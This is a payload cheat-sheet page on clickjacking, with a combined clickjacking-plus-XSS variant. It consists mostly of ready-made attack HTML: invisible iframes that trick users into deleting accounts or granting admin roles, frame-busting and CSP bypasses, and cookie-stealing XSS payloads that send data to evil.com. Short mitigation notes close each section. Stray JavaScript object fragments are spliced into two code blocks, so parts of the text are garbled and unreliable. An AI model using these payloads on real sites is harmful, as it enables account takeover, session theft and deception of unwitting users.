# Clickjacking

_2 web payloads_

### Basic Clickjacking  `clickjacking-basic`
_Tricks a user into unknowingly clicking a hidden malicious button or link by overlaying a transparent iframe_
Subcategory: **Basic** · tags: `clickjacking` `ui-redressing` `iframe`

**Prerequisites:**
- The target site allows being embedded in an iframe
- The target does not set the X-Frame-Options response header
- The target does not configure a CSP frame-ancestors policy
- Basic HTML/CSS knowledge

**Attack chain:**

**Detect X-Frame-Options and CSP**
> Check whether the target sets anti-clickjacking security headers
_platform: linux_
```
curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# Batch detection:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done
```
**Syntax breakdown:**
- `curl -sI` — Silent mode, fetch HTTP response headers only _command_
- `grep -iE` — Case-insensitive extended regex matching _command_
- `x-frame-options` — Security header that prevents the page from being embedded in an iframe _value_
- `frame-ancestors` — CSP directive that controls which origins may embed this page _value_

**Basic transparent iframe overlay POC**
> Build a decoy page that overlays the target's sensitive operation page as a transparent iframe on top of a decoy button
```
<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* almost fully transparent */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>
```
**Syntax breakdown:**
- `opacity: 0.0001` — Makes the iframe almost fully transparent so the user cannot see it _value_
- `z-index: 2` — Ensures the iframe layer sits above the decoy button _value_
- `position: absolute` — Absolute positioning lets the iframe and button overlap precisely _value_
- `/account/delete` — Sensitive operation URL on the target site (e.g. delete account, transfer funds) _value_

**Multi-step Drag-and-Drop hijacking**
> Uses the HTML5 drag-and-drop API to achieve cross-origin data extraction clickjacking
```
<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // Listen for drag events; can extract data cross-origin
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>
```
**Syntax breakdown:**
- `draggable="true"` — Makes the element draggable _value_
- `dataTransfer.getData` — Extracts data from the drag operation _command_
- `sandbox="allow-scripts allow-forms"` — Restricts iframe permissions while still allowing scripts and forms _value_

**Bypass using CSS pointer-events**
> Uses pointer-events:none so the overlay does not intercept clicks, letting clicks pass straight through to the underlying iframe
```
<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- decoy content does not intercept mouse events at all -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>
```
**Syntax breakdown:**
- `pointer-events: none` — Makes the element unresponsive to mouse events so clicks pass through to the layer below _value_
- `pointer-events: auto` — The iframe keeps responding to mouse events normally _value_

**WAF/EDR bypass variants:**

**iframe sandbox attribute bypass**
> Bypasses some frame-busting scripts by combining the iframe sandbox attributes allow-top-navigation and allow-scripts
```
<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- bypass using sandbox allow-top-navigation -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- bypass using sandbox + srcdoc -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>
```
**Syntax breakdown:**
- `<script>` — Script tag _tag_
- `<iframe>` — Inline frame (iframe) _tag_

**X-Frame-Options ALLOW-FROM inconsistency**
> X-Frame-Options ALLOW-FROM behaves inconsistently across browsers; Chrome/Safari ignore this directive entirely
```
<!-- exploit inconsistent browser support for ALLOW-FROM -->
<!-- Chrome/Safari ignore ALLOW-FROM; only CSP frame-ancestors takes effect -->

<!-- double iframe to bypass frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- bypass using window.name -->
<iframe src="attacker-page.html" name="payload_data"></iframe>
```
**Syntax breakdown:**
- `<iframe>` — Inline frame (iframe) _tag_

**Double-nested iframe bypass**
> Uses a double-nested iframe so the `top` reference in a frame-busting script points to the intermediate page instead of the attacker page
```
<!-- double nesting to bypass frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html content -->
<html><body>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: 'Inline frame (iframe)', en: 'Inline frame (iframe)' }, type: 'tag' }
          ]
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload blocks navigation -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>
```

**Overview:** Clickjacking (UI Redressing) is a visual deception attack in which the attacker overlays a transparent iframe on top of a decoy page, tricking the user into unknowingly clicking sensitive operation buttons hidden inside the iframe. The attack can lead to dangerous operations such as account deletion, fund transfers, and authorization changes.

**Vulnerability principle:** The target website does not set an X-Frame-Options response header (DENY/SAMEORIGIN) and does not configure the Content-Security-Policy frame-ancestors directive, allowing any third-party page to embed and load it via an iframe.

**Exploitation method:** Exploitation flow: 1) Detect whether the target allows iframe embedding 2) Locate sensitive operation pages on the target site (e.g. delete, transfer, change permissions) 3) Build a decoy page that overlays the target page as a transparent iframe 4) Precisely align the target button inside the iframe with the decoy button 5) Lure the victim to visit the decoy page and click

**Mitigation:** 1) Set X-Frame-Options: DENY or SAMEORIGIN 2) Configure CSP: frame-ancestors 'self' 3) Add secondary confirmation for sensitive operations 4) Use the SameSite cookie attribute 5) JavaScript frame-busting script (as a fallback)

---

### Clickjacking + XSS  `clickjacking-xss`
_Combines clickjacking with XSS: first trigger an XSS attack vector via clickjacking to gain deeper control_
Subcategory: **XSS** · tags: `clickjacking` `xss`

**Prerequisites:**
- The target has an XSS vulnerability
- The target allows being embedded in an iframe
- The XSS payload can be triggered by a click

**Attack chain:**

**Identify an exploitable XSS and Clickjacking combination**
> Detect both clickjacking and XSS vulnerabilities on the target at once
```
# 1. Detect iframe embedding protection
curl -sI "http://target.com" | grep -i "x-frame-options|frame-ancestors"

# 2. Detect known XSS points
curl -s "http://target.com/search?q=<script>alert(1)</script>" | grep -i "script"

# 3. Detect Self-XSS (requires user interaction)
curl -s "http://target.com/profile/edit" -d "bio=<img+src=x+onerror=alert(document.cookie)>"
```
**Syntax breakdown:**
- `curl -sI` — Fetch response headers to detect security configuration _command_
- `grep -i` — Case-insensitive search for security headers _command_

**Self-XSS + Clickjacking combined exploitation**
> Uses multi-step clickjacking to trigger Self-XSS: first guide the user to click an edit button, then trick them into pasting an XSS payload
```
<html><head>
<style>
  iframe { position:absolute; top:0; left:0; width:800px; height:600px; opacity:0.0001; z-index:10; }
  .step { position:absolute; z-index:1; }
</style>
<script>
var step = 0;
function nextStep() {
  step++;
  if (step === 1) {
    // Step 1: lure the user to click the "profile edit" button
    document.getElementById("msg").innerText = "Step 1: Click to claim reward!";
  } else if (step === 2) {
    // Step 2: lure the user to click the input field
    document.getElementById("msg").innerText = "Step 2: Click to verify identity!";
  } else if (step === 3) {
    // Step 3: lure a paste (Ctrl+V) to execute the XSS
    document.getElementById("msg").innerText = "Step 3: Press Ctrl+V to paste verification code!";
    navigator.clipboard.writeText('<img src=x onerror="fetch('https://evil.com/steal?'+document.cookie)">');
  }
}
</script></head>
<body onload="nextStep()">
  <h1 id="msg">Loading prize...</h1>
  <button class="step" onclick="nextStep()" style="top:200px;left:100px;">Next Step</button>
  <iframe src="http://target.com/profile/edit"></iframe>
</body></html>
```
**Syntax breakdown:**
- `navigator.clipboard.writeText` — Writes a malicious payload to the clipboard via JS _command_
- `onload="nextStep()"` — Automatically starts the attack flow after the page loads _value_
- `opacity:0.0001` — Hides the target iframe _value_

**Reflected XSS + iframe embedding exploitation**
> Loads a URL containing an XSS payload via an iframe, using clickjacking to trigger an XSS that requires user interaction
```
<html><head>
<style>
  iframe { width:100%; height:100%; position:absolute; top:0; left:0; opacity:0; border:none; }
</style></head>
<body>
  <h1>Free WiFi Login</h1>
  <p>Please click "Connect" to access free WiFi</p>
  <button style="padding:15px 40px; font-size:18px; margin-top:20px;">Connect</button>
  <!-- iframe loads a URL containing XSS; button precisely aligned to trigger the XSS -->
  <iframe src="http://target.com/page?callback=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"></iframe>
</body></html>
```
**Syntax breakdown:**
- `callback=<script>...` — Uses a reflected XSS parameter to inject a malicious script _value_
- `document.location=` — Exfiltrates the user's cookie to the attacker's server _command_

**WAF/EDR bypass variants:**

**CSP frame-ancestors bypass**
> Uses data:/blob: URIs and the srcdoc attribute to bypass the CSP frame-ancestors directive's restrictions on iframe content
```
<!-- bypass CSP using a data: URI (old browsers) -->
<iframe src="data:text/html,<script>alert(document.domain)</script>"></iframe>

<!-- blob: URI bypass -->
<script>
var blob = new Blob(['<script>alert(1)<\/script>'], {type: 'text/html'});
document.getElementById('frame').src = URL.createObjectURL(blob);
</script>

<!-- srcdoc attribute bypass -->
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```
**Syntax breakdown:**
- `<script>` — Script tag _tag_
- `alert()` — Popup function _function_
- `<iframe>` — Inline frame (iframe) _tag_

**sandbox attribute misconfiguration exploitation**
> Escapes the sandbox using the allow-scripts + allow-same-origin combination or allow-popups-to-escape-sandbox in the sandbox attribute
```
<!-- sandbox allow-scripts permits JS execution -->
<iframe src="https://target.com" sandbox="allow-scripts allow-same-origin">
</iframe>,
          syntaxBreakdown: [
            { part: '<script>', explanation: { zh: 'Script tag', en: 'Scripttag' }, type: 'tag' },
            { part: '<iframe>', explanation: { zh: 'Inline frame (iframe)', en: 'Inline frame (iframe)' }, type: 'tag' },
            { part: 'alert()', explanation: { zh: 'Popup function', en: 'Alert function' }, type: 'function' }
          ]

<!-- escape using allow-popups -->
<iframe src="https://target.com" sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox">
</iframe>

<!-- allow-top-navigation + clickjacking -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation-by-user-activation">
</iframe>
```

**Drag-and-drop hijacking to inject XSS**
> Uses the HTML5 drag-and-drop API to drag an XSS payload from the attacker page into an editable area in the target iframe
```
<!-- drag-and-drop hijacking injects the XSS payload into the target page -->
<style>
#drag { position: absolute; z-index: 1; opacity: 0; }
#target { position: absolute; z-index: 0; }
</style>

<div id="drag" draggable="true"
  ondragstart="event.dataTransfer.setData('text/html','<img src=x onerror=alert(1)>')">
  Drag me
</div>

<iframe id="target" src="https://target.com/page-with-editable-field"
  sandbox="allow-scripts allow-same-origin">
</iframe>
```
**Syntax breakdown:**
- `<img>` — Image tag _tag_
- `onerror` — Error event _keyword_
- `alert()` — Popup function _function_
- `<iframe>` — Inline frame (iframe) _tag_

**Overview:** The clickjacking + XSS combination attack uses two client-side vulnerabilities together. A standalone Self-XSS usually has limited impact (it requires the victim to paste the payload into an input field themselves), but combined with clickjacking, the attacker can turn a Self-XSS into a remotely exploitable vulnerability through multi-step guidance.

**Vulnerability principle:** 1) The target has a Self-XSS or reflected XSS vulnerability 2) The target does not set X-Frame-Options or CSP frame-ancestors 3) Each vulnerability has limited value on its own, but the impact escalates when combined

**Exploitation method:** Exploitation flow: 1) Discover a Self-XSS vulnerability point (e.g. a profile edit page) 2) Confirm the target allows iframe embedding 3) Build a multi-step clickjacking page 4) Pre-load the XSS payload via the clipboard API 5) Guide the user through the "click edit - paste - submit" operation chain

**Mitigation:** 1) Set X-Frame-Options: DENY 2) Fix all XSS vulnerabilities (including Self-XSS) 3) Apply strict HTML encoding to input content 4) Configure CSP to restrict inline script execution 5) Use CSRF tokens for critical operations

---
